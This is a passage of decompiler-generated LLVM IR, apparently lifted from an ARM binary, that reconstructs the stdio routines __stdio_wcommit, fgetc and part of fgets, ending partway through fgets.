define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17578 = load i32, i32* @r4, align 4
  store i32 %v3_17578, i32* %stack_var_-8, align 4
  %v1_1757c = add i32 %arg1, 8
  %v2_1757c = inttoptr i32 %v1_1757c to i32*
  %v3_1757c = load i32, i32* %v2_1757c, align 4
  store i32 %v3_1757c, i32* @r1, align 4
  %v1_17580 = add i32 %arg1, 16
  %v2_17580 = inttoptr i32 %v1_17580 to i32*
  %v3_17580 = load i32, i32* %v2_17580, align 4
  %v9_17584 = icmp eq i32 %v3_17580, %v3_1757c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_17584, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1757c, i32* %v2_17580, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_17590 = xor i1 %v9_17584, true
  call void @__pseudo_cond_branch(i1 %v1_17590, i32 ptrtoint (i32* @global_var_18f68.775 to i32))
  %v0_17594 = load i32, i32* %r4.global-to-local, align 4
  %v1_17594 = add i32 %v0_17594, 8
  %v2_17594 = inttoptr i32 %v1_17594 to i32*
  %v3_17594 = load i32, i32* %v2_17594, align 4
  %v1_17598 = add i32 %v0_17594, 16
  %v2_17598 = inttoptr i32 %v1_17598 to i32*
  %v3_17598 = load i32, i32* %v2_17598, align 4
  %v2_1759c = sub i32 %v3_17598, %v3_17594
  %v2_175a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_175a0, i32* @r4, align 4
  ret i32 %v2_1759c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_175a8 = load i32, i32* @r4, align 4
  store i32 %v3_175a8, i32* %stack_var_-20, align 4
  %v6_175a8 = load i32, i32* @r5, align 4
  %v9_175a8 = load i32, i32* @r6, align 4
  %v12_175a8 = load i32, i32* @r7, align 4
  %v15_175a8 = load i32, i32* @lr, align 4
  %v1_175ac = add i32 %arg1, 52
  %v2_175ac = inttoptr i32 %v1_175ac to i32*
  %v3_175ac = load i32, i32* %v2_175ac, align 4
  store i32 %v3_175ac, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_175b0 = icmp eq i32 %v3_175ac, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_175b0, label %dec_label_pc_175e4, label %dec_label_pc_175c0

dec_label_pc_175c0:                               ; preds = %entry
  %v1_175c0 = add i32 %arg1, 16
  %v2_175c0 = inttoptr i32 %v1_175c0 to i32*
  %v3_175c0 = load i32, i32* %v2_175c0, align 4
  store i32 %v3_175c0, i32* %r2.global-to-local, align 4
  %v1_175c4 = add i32 %arg1, 24
  %v2_175c4 = inttoptr i32 %v1_175c4 to i32*
  %v3_175c4 = load i32, i32* %v2_175c4, align 4
  store i32 %v3_175c4, i32* %r3.global-to-local, align 4
  %v3_175c8 = icmp uge i32 %v3_175c0, %v3_175c4
  store i1 %v3_175c8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_175c8, label %dec_label_pc_175d8, label %.thread

.thread:                                          ; preds = %dec_label_pc_175c0
  %v2_175cc = inttoptr i32 %v3_175c0 to i8*
  %v3_175cc = load i8, i8* %v2_175cc, align 1
  %v4_175cc = zext i8 %v3_175cc to i32
  store i32 %v4_175cc, i32* %r5.global-to-local, align 4
  %v6_175cc = add i32 %v3_175c0, 1
  store i32 %v6_175cc, i32* %r2.global-to-local, align 4
  store i32 %v6_175cc, i32* %v2_175c0, align 4
  br label %dec_label_pc_176dc

dec_label_pc_175d8:                               ; preds = %dec_label_pc_175c0
  %v1_175d8 = inttoptr i32 %arg1 to i16*
  %v2_175d8 = call i32 @getc_unlocked(i16* %v1_175d8)
  store i32 %v2_175d8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_176dc

dec_label_pc_175e4:                               ; preds = %entry
  %v0_175e4 = call i32 @__aeabi_read_tp()
  %v0_175e8 = load i32, i32* @r7, align 4
  %v1_175e8 = add i32 %v0_175e8, 64
  %v2_175e8 = inttoptr i32 %v1_175e8 to i32*
  %v3_175e8 = load i32, i32* %v2_175e8, align 4
  store i32 %v3_175e8, i32* %r3.global-to-local, align 4
  %v1_175ec = add i32 %v0_175e4, -1168
  store i32 %v1_175ec, i32* @r6, align 4
  %v3_175f0 = icmp uge i32 %v3_175e8, %v1_175ec
  store i1 %v3_175f0, i1* %cpsr_c.global-to-local, align 1
  %v9_175f0 = icmp eq i32 %v3_175e8, %v1_175ec
  br i1 %v9_175f0, label %dec_label_pc_17638, label %dec_label_pc_175f8

dec_label_pc_175f8:                               ; preds = %dec_label_pc_175e4
  %v1_175f8 = add i32 %v0_175e8, 56
  store i32 %v1_175f8, i32* @r5, align 4
  store i32 %v1_175f8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17604

dec_label_pc_17604:                               ; preds = %dec_label_pc_17610.dec_label_pc_17604_crit_edge, %dec_label_pc_175f8
  %v0_17604 = phi i32 [ %v0_17604.pre, %dec_label_pc_17610.dec_label_pc_17604_crit_edge ], [ %v1_175f8, %dec_label_pc_175f8 ]
  %v1_17604 = inttoptr i32 %v0_17604 to i32*
  %v2_17604 = load i32, i32* %v1_17604, align 4
  store i32 %v2_17604, i32* %r3.global-to-local, align 4
  %v1_17608 = load i32, i32* @r4, align 4
  %v3_17608 = icmp uge i32 %v2_17604, %v1_17608
  store i1 %v3_17608, i1* %cpsr_c.global-to-local, align 1
  %v9_17608 = icmp eq i32 %v2_17604, %v1_17608
  br i1 %v9_17608, label %dec_label_pc_17610, label %dec_label_pc_17628

dec_label_pc_17610:                               ; preds = %dec_label_pc_17604
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17620 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17620, label %dec_label_pc_17624, label %dec_label_pc_17610.dec_label_pc_17604_crit_edge

dec_label_pc_17610.dec_label_pc_17604_crit_edge:  ; preds = %dec_label_pc_17610
  %v0_17604.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17604

dec_label_pc_17624:                               ; preds = %dec_label_pc_17610
  %v0_17624 = load i32, i32* @r4, align 4
  store i32 %v0_17624, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17628

dec_label_pc_17628:                               ; preds = %dec_label_pc_17604, %dec_label_pc_17624
  %v0_17628 = phi i32 [ %v0_17624, %dec_label_pc_17624 ], [ %v2_17604, %dec_label_pc_17604 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17628 = icmp eq i32 %v0_17628, 0
  br i1 %v2_17628, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_17628
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_17628, %bb
  store i32 95796, i32* @lr, align 4
  %v1_17630 = xor i1 %v2_17628, true
  call void @__pseudo_cond_branch(i1 %v1_17630, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_17634 = load i32, i32* @r6, align 4
  %v1_17634 = load i32, i32* @r7, align 4
  %v2_17634 = add i32 %v1_17634, 64
  %v3_17634 = inttoptr i32 %v2_17634 to i32*
  store i32 %v0_17634, i32* %v3_17634, align 4
  %v0_17638.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17638

dec_label_pc_17638:                               ; preds = %dec_label_pc_175e4, %bb18
  %v1_17648 = phi i32 [ %v0_175e8, %dec_label_pc_175e4 ], [ %v0_17638.pre, %bb18 ]
  %v1_17638 = add i32 %v1_17648, 60
  %v2_17638 = inttoptr i32 %v1_17638 to i32*
  %v3_17638 = load i32, i32* %v2_17638, align 4
  store i32 %v3_17638, i32* %r2.global-to-local, align 4
  %v1_1763c = add i32 %v1_17648, 16
  %v2_1763c = inttoptr i32 %v1_1763c to i32*
  %v3_1763c = load i32, i32* %v2_1763c, align 4
  store i32 %v3_1763c, i32* @r1, align 4
  %v1_17640 = add i32 %v1_17648, 24
  %v2_17640 = inttoptr i32 %v1_17640 to i32*
  %v3_17640 = load i32, i32* %v2_17640, align 4
  store i32 %v3_17640, i32* %r3.global-to-local, align 4
  %v1_17644 = add i32 %v3_17638, 1
  store i32 %v1_17644, i32* %r2.global-to-local, align 4
  store i32 %v1_17644, i32* %v2_17638, align 4
  %v0_1764c = load i32, i32* @r1, align 4
  %v1_1764c = load i32, i32* %r3.global-to-local, align 4
  %v3_1764c = icmp uge i32 %v0_1764c, %v1_1764c
  store i1 %v3_1764c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1764c, label %dec_label_pc_1765c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17638
  %v2_17650 = inttoptr i32 %v0_1764c to i8*
  %v3_17650 = load i8, i8* %v2_17650, align 1
  %v4_17650 = zext i8 %v3_17650 to i32
  store i32 %v4_17650, i32* %r5.global-to-local, align 4
  %v6_17650 = add i32 %v0_1764c, 1
  store i32 %v6_17650, i32* @r1, align 4
  %v2_17654 = load i32, i32* @r7, align 4
  %v3_17654 = add i32 %v2_17654, 16
  %v4_17654 = inttoptr i32 %v3_17654 to i32*
  store i32 %v6_17650, i32* %v4_17654, align 4
  br label %dec_label_pc_17668

dec_label_pc_1765c:                               ; preds = %dec_label_pc_17638
  %v0_1765c = load i32, i32* @r7, align 4
  %v1_17660 = inttoptr i32 %v0_1765c to i16*
  %v2_17660 = call i32 @getc_unlocked(i16* %v1_17660)
  store i32 %v2_17660, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17668

dec_label_pc_17668:                               ; preds = %.thread2, %dec_label_pc_1765c
  %v0_17668 = load i32, i32* @r7, align 4
  %v1_17668 = add i32 %v0_17668, 60
  %v2_17668 = inttoptr i32 %v1_17668 to i32*
  %v3_17668 = load i32, i32* %v2_17668, align 4
  %v1_1766c = add i32 %v3_17668, -1
  store i32 %v1_1766c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17670 = icmp eq i32 %v1_1766c, 0
  store i32 %v1_1766c, i32* %v2_17668, align 4
  br i1 %v2_17670, label %dec_label_pc_1767c, label %dec_label_pc_176dc

dec_label_pc_1767c:                               ; preds = %dec_label_pc_17668
  %v0_1767c = load i32, i32* %r3.global-to-local, align 4
  %v1_1767c = load i32, i32* @r7, align 4
  %v2_1767c = add i32 %v1_1767c, 64
  %v3_1767c = inttoptr i32 %v2_1767c to i32*
  store i32 %v0_1767c, i32* %v3_1767c, align 4
  %v0_17680 = load i32, i32* @r7, align 4
  %v1_17680 = add i32 %v0_17680, 56
  store i32 %v1_17680, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17684

dec_label_pc_17684:                               ; preds = %dec_label_pc_176b4.dec_label_pc_17684_crit_edge, %dec_label_pc_1767c
  %v0_1768c = phi i32 [ %v0_1768c.pre, %dec_label_pc_176b4.dec_label_pc_17684_crit_edge ], [ %v1_17680, %dec_label_pc_1767c ]
  %v0_17684 = phi i32 [ %v0_17684.pre, %dec_label_pc_176b4.dec_label_pc_17684_crit_edge ], [ %v0_17680, %dec_label_pc_1767c ]
  %v1_17684 = add i32 %v0_17684, 56
  %v2_17684 = inttoptr i32 %v1_17684 to i32*
  %v3_17684 = load i32, i32* %v2_17684, align 4
  store i32 %v3_17684, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1768c, i32* %r2.global-to-local, align 4
  %v1_1769022 = inttoptr i32 %v0_1768c to i32*
  %v2_1769023 = load i32, i32* %v1_1769022, align 4
  store i32 %v2_1769023, i32* %r3.global-to-local, align 4
  %v3_1769425 = icmp uge i32 %v2_1769023, %v3_17684
  store i1 %v3_1769425, i1* %cpsr_c.global-to-local, align 1
  %v9_1769431 = icmp eq i32 %v2_1769023, %v3_17684
  br i1 %v9_1769431, label %dec_label_pc_1769c, label %dec_label_pc_176b4

dec_label_pc_1769c:                               ; preds = %dec_label_pc_17684, %dec_label_pc_1769c.dec_label_pc_17690_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_176ac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_176ac, label %dec_label_pc_176b0, label %dec_label_pc_1769c.dec_label_pc_17690_crit_edge

dec_label_pc_1769c.dec_label_pc_17690_crit_edge:  ; preds = %dec_label_pc_1769c
  %v0_17690.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17694.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17690 = inttoptr i32 %v0_17690.pre to i32*
  %v2_17690 = load i32, i32* %v1_17690, align 4
  store i32 %v2_17690, i32* %r3.global-to-local, align 4
  %v3_17694 = icmp uge i32 %v2_17690, %v1_17694.pre
  store i1 %v3_17694, i1* %cpsr_c.global-to-local, align 1
  %v9_17694 = icmp eq i32 %v2_17690, %v1_17694.pre
  br i1 %v9_17694, label %dec_label_pc_1769c, label %dec_label_pc_176b4

dec_label_pc_176b0:                               ; preds = %dec_label_pc_1769c
  %v0_176b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_176b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_176b4

dec_label_pc_176b4:                               ; preds = %dec_label_pc_17684, %dec_label_pc_1769c.dec_label_pc_17690_crit_edge, %dec_label_pc_176b0
  %v0_176bc = phi i32 [ %v0_176b0, %dec_label_pc_176b0 ], [ %v2_1769023, %dec_label_pc_17684 ], [ %v2_17690, %dec_label_pc_1769c.dec_label_pc_17690_crit_edge ]
  %v1_176b4 = phi i32 [ %v0_176b0, %dec_label_pc_176b0 ], [ %v3_17684, %dec_label_pc_17684 ], [ %v1_17694.pre, %dec_label_pc_1769c.dec_label_pc_17690_crit_edge ]
  %v3_176b4 = icmp uge i32 %v0_176bc, %v1_176b4
  store i1 %v3_176b4, i1* %cpsr_c.global-to-local, align 1
  %v9_176b4 = icmp eq i32 %v0_176bc, %v1_176b4
  br i1 %v9_176b4, label %dec_label_pc_176bc, label %dec_label_pc_176b4.dec_label_pc_17684_crit_edge

dec_label_pc_176b4.dec_label_pc_17684_crit_edge:  ; preds = %dec_label_pc_176b4
  %v0_17684.pre = load i32, i32* @r7, align 4
  %v0_1768c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17684

dec_label_pc_176bc:                               ; preds = %dec_label_pc_176b4
  %v2_176bc = icmp ne i32 %v1_176b4, 0
  store i1 %v2_176bc, i1* %cpsr_c.global-to-local, align 1
  %v7_176c0 = icmp slt i32 %v1_176b4, 2
  br i1 %v7_176c0, label %dec_label_pc_176dc, label %dec_label_pc_176c4

dec_label_pc_176c4:                               ; preds = %dec_label_pc_176bc
  %v0_176c8 = load i32, i32* @r1, align 4
  %v1_176c8 = add i32 %v0_176c8, 129
  store i32 %v1_176c8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_176dc

dec_label_pc_176dc:                               ; preds = %.thread, %dec_label_pc_17668, %dec_label_pc_176c4, %dec_label_pc_176bc, %dec_label_pc_175d8
  %v0_176dc = load i32, i32* %r5.global-to-local, align 4
  %v2_176e4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_176e4, i32* @r4, align 4
  store i32 %v6_175a8, i32* @r5, align 4
  store i32 %v9_175a8, i32* @r6, align 4
  store i32 %v12_175a8, i32* @r7, align 4
  store i32 %v15_175a8, i32* @lr, align 4
  ret i32 %v0_176dc

; uselistorder directives
  uselistorder i32 %v0_176b0, { 1, 0, 2 }
  uselistorder i32 %v1_17694.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1764c, { 1, 0, 2 }
  uselistorder i32 %v1_17648, { 0, 2, 1 }
  uselistorder i32 %v1_17608, { 1, 0 }
  uselistorder i32 %v3_175c0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_176dc, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_176b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1769c, { 1, 0 }
  uselistorder label %dec_label_pc_17668, { 1, 0 }
  uselistorder label %dec_label_pc_17638, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_17628, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_176ec = load i32, i32* @r4, align 4
  store i32 %v3_176ec, i32* %stack_var_-32, align 4
  %v6_176ec = load i32, i32* @r5, align 4
  %v9_176ec = load i32, i32* @r6, align 4
  %v12_176ec = load i32, i32* @r7, align 4
  %v15_176ec = load i32, i32* @r8, align 4
  %v24_176ec = load i32, i32* @lr, align 4
  %v1_176f0 = add i32 %arg3, 52
  %v2_176f0 = inttoptr i32 %v1_176f0 to i32*
  %v3_176f0 = load i32, i32* %v2_176f0, align 4
  store i32 %v3_176f0, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_176f4 = icmp eq i32 %v3_176f0, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_176f4, label %dec_label_pc_17708, label %dec_label_pc_1776c

dec_label_pc_17708:                               ; preds = %entry
  %v0_17708 = call i32 @__aeabi_read_tp()
  %v1_1770c = add i32 %arg3, 64
  %v2_1770c = inttoptr i32 %v1_1770c to i32*
  %v3_1770c = load i32, i32* %v2_1770c, align 4
  store i32 %v3_1770c, i32* %r3.global-to-local, align 4
  %v1_17710 = add i32 %v0_17708, -1168
  store i32 %v1_17710, i32* @r8, align 4
  %v3_17714 = icmp uge i32 %v3_1770c, %v1_17710
  store i1 %v3_17714, i1* %cpsr_c.global-to-local, align 1
  %v9_17714 = icmp eq i32 %v3_1770c, %v1_17710
  br i1 %v9_17714, label %dec_label_pc_17760, label %dec_label_pc_1771c

dec_label_pc_1771c:                               ; preds = %dec_label_pc_17708
  %v1_1771c = add i32 %arg3, 56
  store i32 %v1_1771c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1771c, i32* %r2.global-to-local, align 4
  %v0_17728 = load i32, i32* @r6, align 4
  store i32 %v0_17728, i32* @r4, align 4
  %v1_1772c36 = inttoptr i32 %v1_1771c to i32*
  %v2_1772c37 = load i32, i32* %v1_1772c36, align 4
  store i32 %v2_1772c37, i32* %r3.global-to-local, align 4
  %v3_1773039 = icmp uge i32 %v2_1772c37, %v0_17728
  store i1 %v3_1773039, i1* %cpsr_c.global-to-local, align 1
  %v9_1773045 = icmp eq i32 %v2_1772c37, %v0_17728
  br i1 %v9_1773045, label %dec_label_pc_17738, label %dec_label_pc_17750

dec_label_pc_17738:                               ; preds = %dec_label_pc_1771c, %dec_label_pc_17738.dec_label_pc_1772c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17748 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17748, label %dec_label_pc_1774c, label %dec_label_pc_17738.dec_label_pc_1772c_crit_edge

dec_label_pc_17738.dec_label_pc_1772c_crit_edge:  ; preds = %dec_label_pc_17738
  %v0_1772c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17730.pre = load i32, i32* @r4, align 4
  %v1_1772c = inttoptr i32 %v0_1772c.pre to i32*
  %v2_1772c = load i32, i32* %v1_1772c, align 4
  store i32 %v2_1772c, i32* %r3.global-to-local, align 4
  %v3_17730 = icmp uge i32 %v2_1772c, %v1_17730.pre
  store i1 %v3_17730, i1* %cpsr_c.global-to-local, align 1
  %v9_17730 = icmp eq i32 %v2_1772c, %v1_17730.pre
  br i1 %v9_17730, label %dec_label_pc_17738, label %dec_label_pc_17750

dec_label_pc_1774c:                               ; preds = %dec_label_pc_17738
  %v0_1774c = load i32, i32* @r4, align 4
  store i32 %v0_1774c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17750

dec_label_pc_17750:                               ; preds = %dec_label_pc_1771c, %dec_label_pc_17738.dec_label_pc_1772c_crit_edge, %dec_label_pc_1774c
  %v0_17750 = phi i32 [ %v0_1774c, %dec_label_pc_1774c ], [ %v2_1772c37, %dec_label_pc_1771c ], [ %v2_1772c, %dec_label_pc_17738.dec_label_pc_1772c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17750 = icmp eq i32 %v0_17750, 0
  br i1 %v2_17750, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_17750
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_17750, %bb
  store i32 96092, i32* @lr, align 4
  %v1_17758 = xor i1 %v2_17750, true
  call void @__pseudo_cond_branch(i1 %v1_17758, i32 ptrtoint (i32* @global_var_15410.657 to i32))
  %v0_1775c = load i32, i32* @r8, align 4
  %v1_1775c = load i32, i32* @r7, align 4
  %v2_1775c = add i32 %v1_1775c, 64
  %v3_1775c = inttoptr i32 %v2_1775c to i32*
  store i32 %v0_1775c, i32* %v3_1775c, align 4
  br label %dec_label_pc_17760

dec_label_pc_17760:                               ; preds = %dec_label_pc_17708, %bb20
  %v0_17760 = load i32, i32* @r7, align 4
  %v1_17760 = add i32 %v0_17760, 60
  %v2_17760 = inttoptr i32 %v1_17760 to i32*
  %v3_17760 = load i32, i32* %v2_17760, align 4
  %v1_17764 = add i32 %v3_17760, 1
  store i32 %v1_17764, i32* %r3.global-to-local, align 4
  store i32 %v1_17764, i32* %v2_17760, align 4
  %v0_1776c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17770.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_17774.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1776c

dec_label_pc_1776c:                               ; preds = %entry, %dec_label_pc_17760
  %v0_17774 = phi i32 [ %arg3, %entry ], [ %v0_17774.pre, %dec_label_pc_17760 ]
  %v0_17770 = phi i32 [ %arg2, %entry ], [ %v0_17770.pre, %dec_label_pc_17760 ]
  %v0_1776c = phi i32 [ %arg1, %entry ], [ %v0_1776c.pre, %dec_label_pc_17760 ]
  store i32 %v0_17770, i32* %r1.global-to-local, align 4
  store i32 %v0_17774, i32* %r2.global-to-local, align 4
  %v3_17778 = inttoptr i32 %v0_1776c to i8*
  %v4_17778 = call i32 @__GI_fgets_unlocked(i8* %v3_17778, i32 %v0_17770, i32 %v0_17774)
  %v0_1777c = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1777c = icmp eq i32 %v0_1777c, 0
  store i32 %v4_17778, i32* %r8.global-to-local, align 4
  br i1 %v2_1777c, label %dec_label_pc_17788, label %dec_label_pc_177fc

dec_label_pc_17788:                               ; preds = %dec_label_pc_1776c
  %v0_17788 = load i32, i32* @r7, align 4
  %v1_17788 = add i32 %v0_17788, 60
  %v2_17788 = inttoptr i32 %v1_17788 to i32*
  %v3_17788 = load i32, i32* %v2_17788, align 4
  %v1_1778c = add i32 %v3_17788, -1
  store i32 %v1_1778c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17790 = icmp eq i32 %v1_1778c, 0
  store i32 %v1_1778c, i32* %v2_17788, align 4
  br i1 %v2_17790, label %dec_label_pc_1779c, label %dec_label_pc_177fc

dec_label_pc_1779c:                               ; preds = %dec_label_pc_17788
  %v0_1779c = load i32, i32* %r3.global-to-local, align 4
  %v1_1779c = load i32, i32* @r7, align 4
  %v2_1779c = add i32 %v1_1779c, 64
  %v3_1779c = inttoptr i32 %v2_1779c to i32*
  store i32 %v0_1779c, i32* %v3_1779c, align 4
  %v0_177a0 = load i32, i32* @r7, align 4
  %v1_177a0 = add i32 %v0_177a0, 56
  store i32 %v1_177a0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_177a4

dec_label_pc_177a4:                               ; preds = %dec_label_pc_177d4.dec_label_pc_177a4_crit_edge, %dec_label_pc_1779c
  %v0_177ac = phi i32 [ %v0_177ac.pre, %dec_label_pc_177d4.dec_label_pc_177a4_crit_edge ], [ %v1_177a0, %dec_label_pc_1779c ]
  %v0_177a4 = phi i32 [ %v0_177a4.pre, %dec_label_pc_177d4.dec_label_pc_177a4_crit_edge ], [ %v0_177a0, %dec_label_pc_1779c ]
  %v1_177a4 = add i32 %v0_177a4, 56
  %v2_177a4 = inttoptr i32 %v1_177a4 to i32*
  %v3_177a4 = load i32, i32* %v2_177a4, align 4
  store i32 %v3_177a4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_177ac, i32* %r2.global-to-local, align 4
  %v1_177b024 = inttoptr i32 %v0_177ac to i32*
  %v2_177b025 = load i32, i32* %v1_177b024, align 4
  store i32 %v2_177b025, i32* %r3.global-to-local, align 4
  %v3_177b427 = icmp uge i32 %v2_177b025, %v3_177a4
  store i1 %v3_177b427, i1* %cpsr_c.global-to-local, align 1
  %v9_177b433 = icmp eq i32 %v2_177b025, %v3_177a4
  br i1 %v9_177b433, label %dec_label_pc_177bc, label %dec_label_pc_177d4

dec_label_pc_177bc:                               ; preds = %dec_label_pc_177a4, %dec_label_pc_177bc.dec_label_pc_177b0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_177cc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_177cc, label %dec_label_pc_177d0, label %dec_label_pc_177bc.dec_label_pc_177b0_crit_edge

dec_label_pc_177bc.dec_label_pc_177b0_crit_edge:  ; preds = %dec_label_pc_177bc
  %v0_177b0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_177b4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_177b0 = inttoptr i32 %v0_177b0.pre to i32*
  %v2_177b0 = load i32, i32* %v1_177b0, align 4
  store i32 %v2_177b0, i32* %r3.global-to-local, align 4
  %v3_177b4 = icmp uge i32 %v2_177b0, %v1_177b4.pre
  store i1 %v3_177b4, i1* %cpsr_c.global-to-local, align 1
  %v9_177b4 = icmp eq i32 %v2_177b0, %v1_177b4.pre
  br i1 %v9_177b4, label %dec_label_pc_177bc, label %dec_label_pc_177d4

dec_label_pc_177d0:                               ; preds = %dec_label_pc_177bc
  %v0_177d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_177d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_177d4

dec_label_pc_177d4:                               ; preds = %dec_label_pc_177a4, %dec_label_pc_177bc.dec_label_pc_177b0_crit_edge, %dec_label_pc_177d0
  %v0_177dc = phi i32 [ %v0_177d0, %dec_label_pc_177d0 ], [ %v2_177b025, %dec_label_pc_177a4 ], [ %v2_177b0, %dec_label_pc_177bc.dec_label_pc_177b0_crit_edge ]
  %v1_177d4 = phi i32 [ %v0_177d0, %dec_label_pc_177d0 ], [ %v3_177a4, %dec_label_pc_177a4 ], [ %v1_177b4.pre, %dec_label_pc_177bc.dec_label_pc_177b0_crit_edge ]
  %v3_177d4 = icmp uge i32 %v0_177dc, %v1_177d4
  store i1 %v3_177d4, i1* %cpsr_c.global-to-local, align 1
  %v9_177d4 = icmp eq i32 %v0_177dc, %v1_177d4
  br i1 %v9_177d4, label %dec_label_pc_177dc, label %dec_label_pc_177d4.dec_label_pc_177a4_crit_edge

dec_label_pc_177d4.dec_label_pc_177a4_crit_edge:  ; preds = %dec_label_pc_177d4
  %v0_177a4.pre = load i32, i32* @r7, align 4
  %v0_177ac.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_177a4

dec_label_pc_177dc:                               ; preds = %dec_label_pc_177d4
  %v2_177dc = icmp ne i32 %v1_177d4, 0
  store i1 %v2_177dc, i1* %cpsr_c.global-to-local, align 1
  %v7_177e0 = icmp slt i32 %v1_177d4, 2
  br i1 %v7_177e0, label %dec_label_pc_177fc, label %dec_label_pc_177e4

dec_label_pc_177e4:                               ; preds = %dec_label_pc_177dc
  %v0_177e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_177e8 = add i32 %v0_177e8, 129
  store i32 %v1_177e8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_177fc

